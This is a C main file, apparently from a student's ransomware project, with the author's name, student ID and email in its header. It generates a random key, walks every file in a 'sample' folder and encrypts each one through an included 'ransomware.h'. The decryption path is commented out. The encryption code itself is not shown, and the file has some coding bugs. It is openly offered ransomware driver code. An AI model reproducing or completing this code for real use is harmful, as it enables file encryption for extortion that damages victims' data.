
/*
* File Name: main.c
* Description:
* Made by: Gongtuigigi (Jaeeun Cho)
* Student ID: 21300733
* Email: cocm1324@gmail.com
* Lastly Modified: 18.11.27
*
* OS X 10.13.6
* gcc
*
*/

#include "des.h"
#include "util.h"
#include "ecb.h"
#include "ransomware.h"

int main(){
        char* key = rand_key_generator();

      struct _finddata_t fd;
        long* handle;
        int result = 1;
        char* file;
        char strBuffer[_MAX_PATH] = { 0, };
        char* fileway =  getcwd( strBuffer, _MAX_PATH );
        strcat(fileway, "\\sample\\*.*");
        puts(fileway);

        handle = _findfirst(fileway, &fd); // Set path

        char* filesaveway = getcwd( strBuffer, _MAX_PATH );
        strcat(filesaveway, "\\sample\\");

        // handle = _findfirst("C:\\Users\\kwonda\\Desktop\\tete\\jaeeun\\sample\\*.*", &fd); // Set path
        if (handle == -1){
            printf("There were no files.\n");
            return;
        }

        int NumOfFile = 0;

        // char inputkey[16];
        // printf("Input your key : ");
        // gets(inputkey);
        // printf("%d\n", strlen(inputkey));

        while (result != -1){
            char* fileName = fd.name;
            if( NumOfFile > 1){
                printf("file name : %s \n", fileName);

                // strcat(folderName,fileName);
                encrypt_single_file(fileName, key, filesaveway);
                // decrypt_single_file(fileName, inputkey, filesaveway);

    }
    result = _findnext(handle, &fd);
    NumOfFile++;

    }//finish 'while'. No more files to read

  _findclose(handle);


    return 0;
}
